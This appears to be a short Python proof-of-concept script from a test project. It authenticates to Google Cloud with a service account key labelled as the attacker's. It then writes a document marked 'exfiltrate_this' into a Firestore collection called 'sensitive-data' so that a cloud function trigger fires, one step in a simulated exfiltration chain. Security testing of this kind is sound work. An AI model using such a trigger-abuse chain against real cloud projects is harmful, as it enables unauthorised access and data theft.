import os
import time
from google.cloud import firestore
from google.oauth2 import service_account

# === CONFIG ===
PROJECT_ID = "poc-tfm-tests"
COLLECTION = "sensitive-data"
KEY_PATH = os.path.join(os.path.dirname(__file__), "attacker-sa-key.json")

# === 1. Autenticación como attacker-sa ===
print("[1/2] Authenticating as attacker-sa...")
os.environ["GOOGLE_APPLICATION_CREDENTIALS"] = KEY_PATH
print("[✓] Authenticated using service account key.")

# === 2. Insertar documento en Firestore ===
print("[2/2] Inserting document to trigger the function...")

credentials = service_account.Credentials.from_service_account_file(KEY_PATH)
db = firestore.Client(project=PROJECT_ID, credentials=credentials)

doc_ref = db.collection(COLLECTION).document()
doc_ref.set({
    "data": "exfiltrate_this",
    "source": "attacker-sa",
    "timestamp": firestore.SERVER_TIMESTAMP
})

print(f"[✓] Document inserted into '{COLLECTION}'.")
print("[✔] Trigger should have executed.")
